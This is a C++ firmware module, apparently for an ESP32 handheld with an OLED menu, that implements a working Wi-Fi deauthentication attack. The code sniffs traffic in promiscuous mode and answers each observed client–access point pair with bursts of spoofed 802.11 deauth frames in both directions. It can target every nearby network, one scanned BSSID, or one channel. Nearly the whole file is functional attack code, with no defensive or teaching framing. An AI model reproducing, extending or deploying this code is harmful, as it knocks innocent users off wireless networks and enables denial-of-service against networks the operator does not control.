#include "attack_deauth.h"
#include "wifi_attacks_common.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <math.h>

namespace attack_deauth {

using namespace wifi_attacks_common;

enum DeauthMode : uint8_t {
  DEAUTH_MODE_ALL = 0,
  DEAUTH_MODE_SELECTED
};

enum DeauthState : uint8_t {
  STATE_MENU = 0,
  STATE_SCANNING,
  STATE_SELECT_NET,
  STATE_SELECT_CHAN,
  STATE_START_CONFIRM,
  STATE_RUNNING
};

static DeauthState s_state = STATE_MENU;

struct DeauthScannedAp {
  char ssid[33];
  char bssid[18];
  uint8_t channel;
  int32_t rssi;
};

static const char* const kDeauthMenuItems[] = {
  "ALL NETWORK",
  "TARGET NETWORK",
  "CHANNEL"
};
static const int kDeauthMenuItemCount = sizeof(kDeauthMenuItems) / sizeof(kDeauthMenuItems[0]);

static int        s_deauthMenuSel   = 0;
static float      s_deauthMenuBarY  = (float)kStartY;
static DeauthMode s_deauthMode      = DEAUTH_MODE_ALL;
static char       s_deauthTargetSsid[33] = "All Networks";
static char       s_deauthTargetBssid[18] = "FF:FF:FF:FF:FF:FF";
static uint32_t   s_deauthPkts      = 0;
static uint32_t   s_deauthLastCalc  = 0;
static uint32_t   s_deauthLastPkts  = 0;
static uint32_t   s_deauthRate      = 0;
static int        s_deauthChan      = 6;

static std::vector<DeauthScannedAp> s_deauthNets;
static int        s_deauthNetSel    = 0;
static float      s_deauthNetBarY   = (float)kStartY;
static float      s_deauthNetScroll = 0.0f;
static float      s_deauthNetTargetScroll = 0.0f;

static int        s_deauthChanSel   = 5;
static float      s_deauthChanBarY  = (float)kStartY;
static float      s_deauthChanScroll = 0.0f;
static float      s_deauthChanTargetScroll = 0.0f;

#pragma pack(push, 1)
struct DeauthFrame {
  uint8_t  frame_ctrl[2]       = { 0xC0, 0x00 };
  uint8_t  duration[2]         = { 0x00, 0x00 };
  uint8_t  station[6];
  uint8_t  sender[6];
  uint8_t  access_point[6];
  uint8_t  frag_seq[2]         = { 0xF0, 0xFF };
  uint16_t reason              = 7;
};

struct RawMacHdr {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t  dest[6];
  uint8_t  src[6];
  uint8_t  bssid[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static DeauthFrame        s_deauthFrame;
static bool               s_deauthRunning = false;
static uint8_t            s_targetBssidBytes[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

static bool parseBssidStr(const char* str, uint8_t out[6]) {
  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

static void sendDeauthBurst(int count) {
  for (int i = 0; i < count; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, &s_deauthFrame, sizeof(s_deauthFrame), false);
  }
}

static IRAM_ATTR void deauthSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!s_deauthRunning) return;
  const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
  if (raw->rx_ctrl.sig_len < (int)sizeof(RawMacHdr)) return;
  const RawMacHdr* hdr = (const RawMacHdr*)raw->payload;

  static const uint8_t kBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  if (s_deauthMode == DEAUTH_MODE_SELECTED) {
    if (memcmp(hdr->dest, hdr->bssid, 6) != 0) return;
    if (memcmp(hdr->dest, kBroadcast, 6) == 0)  return;
    if (memcmp(hdr->bssid, s_targetBssidBytes, 6) != 0) return;

    memcpy(s_deauthFrame.station,      hdr->src,  6);
    memcpy(s_deauthFrame.sender,       hdr->dest, 6);
    memcpy(s_deauthFrame.access_point, hdr->dest, 6);
    sendDeauthBurst(8);

    memcpy(s_deauthFrame.station,      hdr->dest, 6);
    memcpy(s_deauthFrame.sender,       hdr->src,  6);
    memcpy(s_deauthFrame.access_point, hdr->dest, 6);
    sendDeauthBurst(8);
  } else {
    if (memcmp(hdr->dest, hdr->bssid, 6) != 0) return;
    if (memcmp(hdr->dest, kBroadcast, 6) == 0)  return;
    memcpy(s_deauthFrame.station,      hdr->src,  6);
    memcpy(s_deauthFrame.sender,       hdr->dest, 6);
    memcpy(s_deauthFrame.access_point, hdr->dest, 6);
    sendDeauthBurst(8);
    memcpy(s_deauthFrame.station,      hdr->dest, 6);
    memcpy(s_deauthFrame.sender,       hdr->src,  6);
    memcpy(s_deauthFrame.access_point, hdr->dest, 6);
    sendDeauthBurst(8);
  }
  s_deauthPkts += 16;
}

static void deauthRealStart() {
  s_deauthRunning = false;
  s_deauthPkts    = 0;
  s_deauthLastPkts = 0;
  s_deauthRate     = 0;

  if (s_deauthMode == DEAUTH_MODE_SELECTED) {
    parseBssidStr(s_deauthTargetBssid, s_targetBssidBytes);
    memcpy(s_deauthFrame.access_point, s_targetBssidBytes, 6);
    memcpy(s_deauthFrame.sender,       s_targetBssidBytes, 6);
  } else {
    memset(s_targetBssidBytes, 0xFF, 6);
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESPone", "", s_deauthChan, 1);
  esp_wifi_set_channel(s_deauthChan, WIFI_SECOND_CHAN_NONE);

  static const wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);
  s_deauthRunning = true;
}

static void deauthRealStop() {
  s_deauthRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

static void deauthStartScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  s_deauthNets.clear();
  s_deauthNetSel = 0;
  s_deauthNetBarY = (float)kStartY;
  s_deauthNetScroll = 0.0f;
  s_deauthNetTargetScroll = 0.0f;
  WiFi.scanNetworks(true, false, false, 250);
  s_state = STATE_SCANNING;
}

static void deauthCheckScanComplete() {
  int16_t count = WiFi.scanComplete();
  if (count >= 0) {
    s_deauthNets.clear();
    for (int16_t i = 0; i < count && i < 40; i++) {
      DeauthScannedAp ap;
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0) ssid = "<Hidden>";
      strncpy(ap.ssid, ssid.c_str(), sizeof(ap.ssid) - 1);
      ap.ssid[sizeof(ap.ssid) - 1] = '\0';
      strncpy(ap.bssid, WiFi.BSSIDstr(i).c_str(), sizeof(ap.bssid) - 1);
      ap.bssid[sizeof(ap.bssid) - 1] = '\0';
      ap.channel = WiFi.channel(i);
      ap.rssi = WiFi.RSSI(i);
      s_deauthNets.push_back(ap);
    }
    WiFi.scanDelete();
    s_state = STATE_SELECT_NET;
  }
}

void open() {
  s_state = STATE_MENU;
  s_deauthMenuSel = 0;
  s_deauthMenuBarY = (float)kStartY;
}

void close() {
  if (s_deauthRunning) {
    deauthRealStop();
  }
  s_state = STATE_MENU;
}

void tick(uint32_t now) {
  if (s_state == STATE_MENU) {
    float targetBarY = (float)(kStartY + s_deauthMenuSel * kRowH);
    float dy = targetBarY - s_deauthMenuBarY;
    if (fabsf(dy) > 0.1f) s_deauthMenuBarY += dy * 0.4f;
    else s_deauthMenuBarY = targetBarY;
  } else if (s_state == STATE_SCANNING) {
    deauthCheckScanComplete();
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_deauthNets.size();
    if (total > 0) {
      if (s_deauthNetSel >= total) s_deauthNetSel = total - 1;
      updateScroll(s_deauthNetSel, total, s_deauthNetScroll, s_deauthNetTargetScroll, s_deauthNetBarY);
    }
  } else if (s_state == STATE_SELECT_CHAN) {
    updateScroll(s_deauthChanSel, 13, s_deauthChanScroll, s_deauthChanTargetScroll, s_deauthChanBarY);
  } else if (s_state == STATE_RUNNING) {
    if (now - s_deauthLastCalc >= 1000) {
      s_deauthRate     = s_deauthPkts - s_deauthLastPkts;
      s_deauthLastPkts = s_deauthPkts;
      s_deauthLastCalc = now;
    }
  }
}

void onKey(const KeyEvent& ev) {
  if (ev.repeat) return;

  if (s_state == STATE_MENU) {
    if (ev.key == BTN_UP) {
      s_deauthMenuSel = (s_deauthMenuSel - 1 + kDeauthMenuItemCount) % kDeauthMenuItemCount;
    } else if (ev.key == BTN_DOWN) {
      s_deauthMenuSel = (s_deauthMenuSel + 1) % kDeauthMenuItemCount;
    } else if (ev.key == BTN_OK) {
      if (s_deauthMenuSel == 0) {
        s_deauthMode = DEAUTH_MODE_ALL;
        strncpy(s_deauthTargetSsid, "All Networks", sizeof(s_deauthTargetSsid) - 1);
        strncpy(s_deauthTargetBssid, "FF:FF:FF:FF:FF:FF", sizeof(s_deauthTargetBssid) - 1);
        s_state = STATE_START_CONFIRM;
      } else if (s_deauthMenuSel == 1) {
        s_deauthMode = DEAUTH_MODE_SELECTED;
        deauthStartScan();
      } else if (s_deauthMenuSel == 2) {
        s_deauthChanSel = s_deauthChan - 1;
        if (s_deauthChanSel < 0) s_deauthChanSel = 0;
        if (s_deauthChanSel > 12) s_deauthChanSel = 12;
        s_deauthChanBarY = (float)kStartY;
        s_deauthChanScroll = 0.0f;
        s_deauthChanTargetScroll = 0.0f;
        s_state = STATE_SELECT_CHAN;
      }
    }
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_deauthNets.size();
    if (total > 0) {
      if (ev.key == BTN_UP) {
        s_deauthNetSel = (s_deauthNetSel - 1 + total) % total;
      } else if (ev.key == BTN_DOWN) {
        s_deauthNetSel = (s_deauthNetSel + 1) % total;
      } else if (ev.key == BTN_OK) {
        const auto& ap = s_deauthNets[s_deauthNetSel];
        s_deauthMode = DEAUTH_MODE_SELECTED;
        strncpy(s_deauthTargetSsid, ap.ssid, sizeof(s_deauthTargetSsid) - 1);
        s_deauthTargetSsid[sizeof(s_deauthTargetSsid) - 1] = '\0';
        strncpy(s_deauthTargetBssid, ap.bssid, sizeof(s_deauthTargetBssid) - 1);
        s_deauthTargetBssid[sizeof(s_deauthTargetBssid) - 1] = '\0';
        s_deauthChan = ap.channel;
        s_state = STATE_START_CONFIRM;
      }
    }
  } else if (s_state == STATE_SELECT_CHAN) {
    if (ev.key == BTN_UP) {
      s_deauthChanSel = (s_deauthChanSel - 1 + 13) % 13;
    } else if (ev.key == BTN_DOWN) {
      s_deauthChanSel = (s_deauthChanSel + 1) % 13;
    } else if (ev.key == BTN_OK) {
      s_deauthChan = s_deauthChanSel + 1;
      s_state = STATE_START_CONFIRM;
    }
  } else if (s_state == STATE_START_CONFIRM) {
    if (ev.key == BTN_OK) {
      s_deauthLastCalc = millis();
      deauthRealStart();
      s_state = STATE_RUNNING;
    }
  }
}

bool onBack() {
  if (s_state == STATE_SCANNING || s_state == STATE_SELECT_NET || s_state == STATE_SELECT_CHAN) {
    s_state = STATE_MENU;
    return true;
  } else if (s_state == STATE_START_CONFIRM) {
    s_state = STATE_MENU;
    return true;
  } else if (s_state == STATE_RUNNING) {
    deauthRealStop();
    s_state = STATE_START_CONFIRM;
    return true;
  } else if (s_state == STATE_MENU) {
    return false;
  }
  return false;
}

void draw(U8G2& u8g2, uint32_t now) {
  if (s_state == STATE_MENU) {
    drawHeader(u8g2, "DEAUTH ATTACK");
    u8g2.setFont(u8g2_font_6x12_tr);

    for (int i = 0; i < kDeauthMenuItemCount; i++) {
      int y = kStartY + i * kRowH;
      u8g2.drawStr(6, y + 10, kDeauthMenuItems[i]);
    }

    u8g2.setDrawColor(2);
    int curY = (int)(s_deauthMenuBarY + 0.5f);
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_START_CONFIRM) {
    drawHeader(u8g2, "DEAUTH ATTACK");
    u8g2.setFont(u8g2_font_5x8_tr);

    char buf[40];
    if (s_deauthMode == DEAUTH_MODE_ALL) {
      snprintf(buf, sizeof(buf), "Target: ALL NETWORKS");
    } else {
      snprintf(buf, sizeof(buf), "Target: %.18s", s_deauthTargetSsid);
    }
    u8g2.drawStr(4, 25, buf);

    if (s_deauthMode == DEAUTH_MODE_SELECTED) {
      snprintf(buf, sizeof(buf), "BSSID: %s", s_deauthTargetBssid);
      u8g2.drawStr(4, 35, buf);
    } else {
      u8g2.drawStr(4, 35, "BSSID: FF:FF:FF:FF:FF:FF");
    }

    snprintf(buf, sizeof(buf), "Channel: %d", s_deauthChan);
    u8g2.drawStr(4, 45, buf);

    u8g2.drawBox(4, 48, 120, 14);
    u8g2.setDrawColor(0);
    u8g2.setFont(u8g2_font_7x14B_tr);
    const char* startTxt = "START";
    int tw = u8g2.getStrWidth(startTxt);
    u8g2.drawStr((128 - tw) / 2, 58, startTxt);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_SCANNING) {
    drawHeader(u8g2, "WIFI SCAN");
    u8g2.setFont(u8g2_font_6x12_tr);
    int dots = (now / 350) % 4;
    char waitBuf[20];
    snprintf(waitBuf, sizeof(waitBuf), "Scanning%.*s", dots, "...");
    int tw = u8g2.getStrWidth(waitBuf);
    u8g2.drawStr((128 - tw) / 2, 40, waitBuf);
    return;
  }

  if (s_state == STATE_SELECT_NET) {
    int total = (int)s_deauthNets.size();
    drawHeader(u8g2, "SELECT TARGET", total);

    if (total == 0) {
      u8g2.setFont(u8g2_font_6x12_tr);
      u8g2.drawStr(16, 38, "No networks found");
      return;
    }

    u8g2.setClipWindow(0, 14, 128, 64);
    u8g2.setFont(u8g2_font_6x12_tr);

    for (int i = 0; i < total; i++) {
      int y = kStartY + (int)(i * kRowH - s_deauthNetScroll + 0.5f);
      if (y < kStartY - kRowH || y > 64) continue;

      const auto& ap = s_deauthNets[i];

      char rightBuf[12];
      snprintf(rightBuf, sizeof(rightBuf), "c%d %d", ap.channel, (int)ap.rssi);
      u8g2.setFont(u8g2_font_5x8_tr);
      int rw = u8g2.getStrWidth(rightBuf);
      u8g2.drawStr(124 - rw, y + 9, rightBuf);

      u8g2.setFont(u8g2_font_6x12_tr);
      int maxW = 124 - rw - 8;
      char netLabel[33];
      strncpy(netLabel, ap.ssid, sizeof(netLabel) - 1);
      netLabel[sizeof(netLabel) - 1] = '\0';
      while (strlen(netLabel) > 0 && u8g2.getStrWidth(netLabel) > maxW) {
        netLabel[strlen(netLabel) - 1] = '\0';
      }
      u8g2.drawStr(6, y + 10, netLabel);
    }

    u8g2.setDrawColor(2);
    int curY = (int)(s_deauthNetBarY + 0.5f);
    if (curY < kStartY) curY = kStartY;
    if (curY > 64 - kRowH) curY = 64 - kRowH;
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);

    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_SELECT_CHAN) {
    drawHeader(u8g2, "SELECT CHANNEL");

    u8g2.setClipWindow(0, 14, 128, 64);
    u8g2.setFont(u8g2_font_6x12_tr);

    for (int i = 0; i < 13; i++) {
      int y = kStartY + (int)(i * kRowH - s_deauthChanScroll + 0.5f);
      if (y < kStartY - kRowH || y > 64) continue;

      char chBuf[24];
      if (i + 1 == s_deauthChan) {
        snprintf(chBuf, sizeof(chBuf), "Channel %d  [Active]", i + 1);
      } else {
        snprintf(chBuf, sizeof(chBuf), "Channel %d", i + 1);
      }
      u8g2.drawStr(6, y + 10, chBuf);
    }

    u8g2.setDrawColor(2);
    int curY = (int)(s_deauthChanBarY + 0.5f);
    if (curY < kStartY) curY = kStartY;
    if (curY > 64 - kRowH) curY = 64 - kRowH;
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);

    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_RUNNING) {
    drawHeader(u8g2, "DEAUTH RUNNING");
    u8g2.setFont(u8g2_font_5x8_tr);

    char buf[40];
    if (s_deauthMode == DEAUTH_MODE_ALL) {
      snprintf(buf, sizeof(buf), "Target: ALL NETWORKS");
    } else {
      snprintf(buf, sizeof(buf), "Target: %.18s", s_deauthTargetSsid);
    }
    u8g2.drawStr(4, 25, buf);

    snprintf(buf, sizeof(buf), "CH: %d  BSSID: %.14s", s_deauthChan, s_deauthTargetBssid);
    u8g2.drawStr(4, 35, buf);

    snprintf(buf, sizeof(buf), "Pkts: %lu   Rate: %lu/s", (unsigned long)s_deauthPkts, (unsigned long)s_deauthRate);
    u8g2.drawStr(4, 45, buf);

    u8g2.drawBox(2, 53, 124, 11);
    u8g2.setDrawColor(0);
    int dots = (now / 200) % 4;
    char statusBuf[24];
    snprintf(statusBuf, sizeof(statusBuf), "SENDING FRAMES%.*s", dots, "...");
    u8g2.drawStr(4, 62, statusBuf);
    u8g2.setDrawColor(1);
    return;
  }
}

}
